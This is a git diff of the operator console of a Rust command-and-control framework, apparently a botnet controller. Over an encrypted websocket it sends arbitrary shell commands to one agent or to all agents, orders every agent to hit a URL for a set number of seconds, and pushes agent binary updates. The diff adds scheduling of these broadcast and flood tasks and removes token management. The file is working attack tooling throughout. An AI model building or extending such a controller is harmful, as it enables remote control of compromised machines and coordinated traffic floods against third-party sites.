@@ -1,4 +1,4 @@
-use crate::handlers::models::{Agent, C2Message};
+use crate::handlers::models::{Agent, C2Message, ScheduledTask};
 use futures::{SinkExt, StreamExt};
 use reqwest::Client;
 use serde_json::{Value, json};
@@ -20,6 +20,8 @@ use chacha20poly1305::{
 };
 use base64;
 use chrono::{DateTime, Utc};
+use std::error::Error;
+use std::io::{stdout, Write};
 
 type WebSocketWrite = futures::stream::SplitSink<
     WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
@@ -37,10 +39,7 @@ pub struct Operator {
 
 impl Operator {
     pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
-        // Carregar o arquivo .env.op explicitamente
         from_filename(".env.op").ok().ok_or("Falha ao carregar o arquivo .env.op")?;
-
-        // Verificar se todas as variáveis de ambiente necessárias estão definidas
         let server_url = "ws://localhost:80/c2".to_string();
         let operator_id = env::var("OPERATOR_ID")
             .map_err(|_| "OPERATOR_ID não está definido no .env.op")?;
@@ -48,8 +47,6 @@ impl Operator {
             .map_err(|_| "OPERATOR_TOKEN não está definido no .env.op")?;
         let operator_key_b64 = env::var("OPERATOR_PRIVATE_KEY")
             .map_err(|_| "OPERATOR_PRIVATE_KEY não está definido no .env.op")?;
-        
-        // Decodificar a chave privada
         let operator_key = base64::decode(&operator_key_b64)
             .map_err(|_| "Erro ao decodificar OPERATOR_PRIVATE_KEY")?;
         let operator_key: [u8; 32] = operator_key.try_into()
@@ -63,11 +60,9 @@ impl Operator {
         let (response_tx, response_rx) = mpsc::channel::<(String, Value, usize, usize)>(100);
 
         let ws_write = Arc::new(tokio::sync::Mutex::new(write));
-
         let ws_write_send = ws_write.clone();
         let ws_write_clone = ws_write.clone();
 
-        // Enviar mensagem de autenticação
         let auth_msg = serde_json::to_string(&C2Message::Authenticate {
             operator_id: operator_id.clone(),
             token,
@@ -76,7 +71,6 @@ impl Operator {
         write.send(WsMessage::text(auth_msg)).await?;
         drop(write);
 
-        // Aguardar resposta de autenticação
         let mut authenticated = false;
         if let Some(Ok(msg)) = read.next().await {
             if msg.is_binary() {
@@ -190,6 +184,16 @@ impl Operator {
                                         ))
                                         .await;
                                 }
+                                C2Message::ScheduledTasks { tasks } => {
+                                    let _ = response_tx
+                                        .send((
+                                            "scheduled".to_string(),
+                                            serde_json::to_value(&tasks).unwrap_or(json!({})),
+                                            tasks.len(),
+                                            0,
+                                        ))
+                                        .await;
+                                }
                                 _ => {}
                             }
                         }
@@ -283,6 +287,8 @@ impl Operator {
                             if parts.len() >= 3 {
                                 let uuid = parts[1].to_string();
                                 let cmd = parts[2..].join(" ");
+                                self.list().await?;
+                                tokio::time::sleep(Duration::from_millis(500)).await;
                                 self.command(&uuid, &cmd).await?;
                             } else {
                                 println!("Uso: command <uuid> <cmd>");
@@ -297,79 +303,28 @@ impl Operator {
                                 println!("Uso: agent-software-update <version> <file_path>");
                             }
                         }
-                        "generate-token" => {
-                            if parts.len() == 2 {
-                                let operator_id = parts[1].to_string();
-                                self.generate_token(&operator_id).await?;
-                            } else {
-                                println!("Uso: generate-token <operator_id>");
-                            }
-                        }
-                        "revoke-token" => {
-                            if parts.len() == 2 {
-                                let token = parts[1].to_string();
-                                self.revoke_token(&token).await?;
-                            } else {
-                                println!("Uso: revoke-token <token>");
-                            }
-                        }
                         "schedule" => {
-                            if parts.len() > 2 {
-                                let time_str = parts[1];
-                                let subcommand = parts[2].to_lowercase();
-                                let execute_at = DateTime::parse_from_rfc3339(time_str)
-                                    .map(|dt| dt.with_timezone(&Utc))
-                                    .map_err(|e| format!("Formato de tempo inválido: {}", e));
-                                match execute_at {
-                                    Ok(execute_at) => {
-                                        match subcommand.as_str() {
-                                            "broadcast" => {
-                                                if parts.len() > 3 {
-                                                    let cmd = parts[3..].join(" ");
-                                                    let args = serde_json::json!({
-                                                        "cmd": cmd
-                                                    });
-                                                    let schedule_msg = serde_json::to_string(&C2Message::Command {
-                                                        uuid: "server".to_string(),
-                                                        cmd: format!("schedule broadcast {} {:?}", execute_at.to_rfc3339(), args),
-                                                    })?;
-                                                    let encrypted = self.encrypt_message(&schedule_msg).await?;
-                                                    self.ws_sender.send(Message::binary(encrypted)).await?;
-                                                    println!("Broadcast agendado para {}", execute_at);
-                                                } else {
-                                                    println!("Uso: schedule <time> broadcast <command>");
-                                                }
-                                            }
-                                            "access" => {
-                                                if parts.len() > 4 {
-                                                    let url = parts[3];
-                                                    let secs = parts[4].parse::<u64>().map_err(|_| "Segundos inválidos")?;
-                                                    let args = serde_json::json!({
-                                                        "url": url,
-                                                        "duration_secs": secs
-                                                    });
-                                                    let schedule_msg = serde_json::to_string(&C2Message::Command {
-                                                        uuid: "server".to_string(),
-                                                        cmd: format!("schedule access {} {:?}", execute_at.to_rfc3339(), args),
-                                                    })?;
-                                                    let encrypted = self.encrypt_message(&schedule_msg).await?;
-                                                    self.ws_sender.send(Message::binary(encrypted)).await?;
-                                                    println!("Acesso agendado para {}", execute_at);
-                                                } else {
-                                                    println!("Uso: schedule <time> access <url> <secs>");
-                                                }
-                                            }
-                                            _ => {
-                                                println!("Comando de agendamento inválido. Use: schedule <time> [broadcast|access] <args>");
-                                            }
-                                        }
-                                    }
-                                    Err(e) => {
-                                        println!("{}", e);
-                                    }
-                                }
+                            self.handle_schedule(&parts[1..]).await?;
+                        }
+                        "scheduled" => {
+                            if parts.len() > 1 && parts[1] == "-a" {
+                                self.list_scheduled(true).await?;
                             } else {
-                                println!("Uso: schedule <time> [broadcast|access] <args>");
+                                self.list_scheduled(false).await?;
+                            }
+                        }
+                        "cancel" => {
+                            if parts.len() != 2 {
+                                println!("Uso: cancel <task_id>");
+                                continue;
+                            }
+                            match parts[1].parse::<i32>() {
+                                Ok(task_id) => {
+                                    let msg = serde_json::to_string(&C2Message::CancelScheduledTask { task_id }).unwrap();
+                                    let encrypted = self.encrypt_message(&msg).await?;
+                                    self.ws_sender.send(Message::binary(encrypted)).await?;
+                                }
+                                Err(_) => println!("ID da tarefa deve ser um número inteiro"),
                             }
                         }
                         "clear" => {
@@ -388,19 +343,21 @@ impl Operator {
                             break;
                         }
                         "help" => {
-                            println!("Comandos disponíveis:");
-                            println!("  list                  - Lista todos os agentes");
-                            println!("  access <url> <secs>   - Ordena que os agentes acessem uma URL por <secs> segundos");
-                            println!("  broadcast <cmd>       - Envia um comando para todos os agentes");
-                            println!("  command <uuid> <cmd>  - Envia um comando para um agente específico");
-                            println!("  agent-software-update <version> <file_path> - Atualiza o software do agente com o binário do arquivo");
-                            println!("  schedule <time> [broadcast|access] <args> - Agenda um comando de broadcast ou acesso");
-                            println!("  clear                 - Limpa o terminal");
-                            println!("  exit                  - Sai do shell");
-                            println!("  help                  - Mostra esta ajuda");
+                            println!("Available commands:");
+                            println!("  *help                  - Show this help");
+                            println!("  *list                  - List all agents");
+                            println!("  *access <url> <secs>   - Order agents to access a URL for <secs> seconds");
+                            println!("  *broadcast <cmd>       - Send a command to all agents");
+                            println!("  *command <uuid> <cmd>  - Send a command to a specific agent");
+                            println!("  *agent-software-update <version> <file_path> - Update agent software with binary file");
+                            println!("  *schedule <time> [broadcast|access] <args> - Schedule a broadcast or access command in seconds or RFC3339 format");
+                            println!("  *scheduled [-a]        - List scheduled tasks (use -a to show all tasks including executed ones)");
+                            println!("  *cancel <task_id>      - Cancel a scheduled task");
+                            println!("  *clear                 - Clear the terminal");
+                            println!("  *exit                  - Exit the shell");
                         }
                         _ => {
-                            println!("Comando desconhecido: {}. Digite 'help' para ver os comandos.", parts[0]);
+                            println!("Unknown command: {}. Type 'help' to see the commands.", parts[0]);
                         }
                     }
                     stdout.write_all(b"\nc2> ").await?;
@@ -429,12 +386,32 @@ impl Operator {
                             stdout.write_all(b"\nc2> ").await?;
                             stdout.flush().await?;
                         }
-                        "response" => {
+                        // "response" => {
+                        //     if let Ok(response) = serde_json::from_value::<Value>(value) {
+                        //         if let Some(output) = response.get("output") {
+                        //             println!("Saída do comando: {}", output);
+                        //         }
+                        //     }
+                        //     stdout.write_all(b"\nc2> ").await?;
+                        //     stdout.flush().await?;
+                        // }
+                        "cancel" => {
                             if let Ok(response) = serde_json::from_value::<Value>(value) {
-                                if let Some(output) = response.get("output") {
-                                    println!("Saída do comando: {}", output);
+                                let success = response.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
+                                let message = response.get("message").and_then(|v| v.as_str()).unwrap_or("Unknown response");
+                                if success {
+                                    println!("[+] {}", message);
+                                } else {
+                                    println!("[-] {}", message);
                                 }
                             }
+                            stdout.write_all(b"\nc2> ").await?;
+                            stdout.flush().await?;
+                        }
+                        "scheduled" => {
+                            let tasks: Vec<ScheduledTask> = serde_json::from_value(value)
+                                .map_err(|e| format!("Erro de desserialização: {}", e))?;
+                            self.handle_scheduled_tasks(tasks);
                             stdout.write_all(b"\nc2> ").await?;
                             stdout.flush().await?;
                         }
@@ -450,6 +427,17 @@ impl Operator {
         let msg = serde_json::to_string(&C2Message::RequestAgentList)?;
         let encrypted = self.encrypt_message(&msg).await?;
         self.ws_sender.send(Message::binary(encrypted)).await?;
+        Ok(())
+    }
+    async fn list_scheduled(&mut self, show_all: bool) -> Result<(), Box<dyn std::error::Error>> {
+        let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all })?;
+        let encrypted = self.encrypt_message(&msg).await?;
+        self.ws_sender.send(Message::binary(encrypted)).await?;
+        if show_all {
+            println!("Fetching all scheduled tasks (including executed ones)...");
+        } else {
+            println!("Fetching pending scheduled tasks...");
+        }
         Ok(())
     }
 
@@ -486,6 +474,7 @@ impl Operator {
             cmd: cmd.to_string(),
         })?;
         let encrypted = self.encrypt_message(&command_msg).await?;
+        eprintln!("Operator sending command to {}: {}", uuid, cmd);
         self.ws_sender.send(Message::binary(encrypted)).await?;
         println!("Comando enviado ao agente {}: {}", uuid, cmd);
         Ok(())
@@ -507,29 +496,6 @@ impl Operator {
         Ok(())
     }
 
-    async fn generate_token(&self, operator_id: &str) -> Result<(), Box<dyn std::error::Error>> {
-        let token = Uuid::new_v4().to_string();
-        let msg = serde_json::to_string(&C2Message::Command {
-            uuid: "server".to_string(),
-            cmd: format!("generate-token {} {}", operator_id, token),
-        })?;
-        let encrypted = self.encrypt_message(&msg).await?;
-        self.ws_sender.send(Message::binary(encrypted)).await?;
-        println!("Token gerado para o operador {}: {}", operator_id, token);
-        Ok(())
-    }
-
-    async fn revoke_token(&self, token: &str) -> Result<(), Box<dyn std::error::Error>> {
-        let msg = serde_json::to_string(&C2Message::Command {
-            uuid: "server".to_string(),
-            cmd: format!("revoke-token {}", token),
-        })?;
-        let encrypted = self.encrypt_message(&msg).await?;
-        self.ws_sender.send(Message::binary(encrypted)).await?;
-        println!("Token revogado: {}", token);
-        Ok(())
-    }
-
     async fn encrypt_message(&self, message: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
         let cipher = XChaCha20Poly1305::new(&self.operator_key.into());
         let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
@@ -537,6 +503,124 @@ impl Operator {
         let mut result = nonce.to_vec();
         result.append(&mut ciphertext);
         Ok(result)
+    }
+
+    async fn handle_schedule(&mut self, args: &[&str]) -> Result<(), Box<dyn Error>> {
+        match args.get(0) {
+            Some(&"-a") => {
+                let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all: true })?;
+                let encrypted = self.encrypt_message(&msg).await?;
+                self.ws_sender.send(Message::binary(encrypted)).await?;
+                println!("Fetching all scheduled tasks (including executed ones)...");
+            }
+            Some(&"cancel") => {
+                if let Some(task_id_str) = args.get(1) {
+                    if let Ok(task_id) = task_id_str.parse::<i32>() {
+                        let msg = serde_json::to_string(&C2Message::CancelScheduledTask { task_id })?;
+                        let encrypted = self.encrypt_message(&msg).await?;
+                        self.ws_sender.send(Message::binary(encrypted)).await?;
+                        println!("Cancelling task {}...", task_id);
+                    } else {
+                        println!("Invalid task ID: {}", task_id_str);
+                    }
+                } else {
+                    println!("Usage: schedule cancel <task_id>");
+                }
+            }
+            Some(&time_str) => {
+                if args.len() < 2 {
+                    println!("Usage: schedule <time> <command_type> [args_json]");
+                    println!("Time can be either:");
+                    println!("  - RFC3339 format (e.g. 2024-03-21T15:30:00Z)");
+                    println!("  - Number of seconds from now (e.g. 60 for 1 minute)");
+                    return Ok(());
+                }
+
+                let execute_at = if let Ok(secs) = time_str.parse::<i64>() {
+                    // Se for um número, interpreta como segundos a partir de agora
+                    Utc::now() + chrono::Duration::seconds(secs)
+                } else if let Ok(dt) = DateTime::parse_from_rfc3339(time_str) {
+                    // Se for uma string RFC3339, usa diretamente
+                    dt.with_timezone(&Utc)
+                } else {
+                    println!("Invalid time format. Use either:");
+                    println!("  - RFC3339 format (e.g. 2024-03-21T15:30:00Z)");
+                    println!("  - Number of seconds from now (e.g. 60 for 1 minute)");
+                    return Ok(());
+                };
+
+                let command = match args[1] {
+                    "broadcast" => {
+                        if args.len() < 3 {
+                            println!("Usage: schedule <time> broadcast <command>");
+                            return Ok(());
+                        }
+                        format!(
+                            "schedule {} {} {}",
+                            args[1],
+                            execute_at.to_rfc3339(),
+                            args[2..].join(" ")
+                        )
+                    }
+                    "access" => {
+                        if args.len() < 4 {
+                            println!("Usage: schedule <time> access <url> <duration_secs>");
+                            return Ok(());
+                        }
+                        format!(
+                            "schedule {} {} {} {}",
+                            args[1],
+                            execute_at.to_rfc3339(),
+                            args[2],
+                            args[3]
+                        )
+                    }
+                    _ => {
+                        println!("Unknown command type: {}. Available types: broadcast, access", args[1]);
+                        return Ok(());
+                    }
+                };
+
+                let msg = serde_json::to_string(&C2Message::Command {
+                    uuid: "server".to_string(),
+                    cmd: command,
+                })?;
+                let encrypted = self.encrypt_message(&msg).await?;
+                self.ws_sender.send(Message::binary(encrypted)).await?;
+                println!("Scheduling task for {}...", execute_at.to_rfc3339());
+            }
+            None => {
+                let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all: false })?;
+                let encrypted = self.encrypt_message(&msg).await?;
+                self.ws_sender.send(Message::binary(encrypted)).await?;
+                println!("Fetching pending scheduled tasks...");
+            }
+        }
+        Ok(())
+    }
+
+    fn handle_scheduled_tasks(&self, tasks: Vec<ScheduledTask>) {
+        if tasks.is_empty() {
+            println!("No scheduled tasks found.");
+            return;
+        }
+
+        println!("\nScheduled Tasks:");
+        println!("{:<5} {:<15} {:<25} {:<10} {}", "ID", "Type", "Execute At", "Status", "Args");
+        println!("{}", "-".repeat(80));
+
+        for task in tasks {
+            let status = if task.executed { "Executed" } else { "Pending" };
+            println!(
+                "{:<5} {:<15} {:<25} {:<10} {}",
+                task.id,
+                task.command_type,
+                task.execute_at.to_rfc3339(),
+                status,
+                task.args
+            );
+        }
+        println!();
     }
 }
 
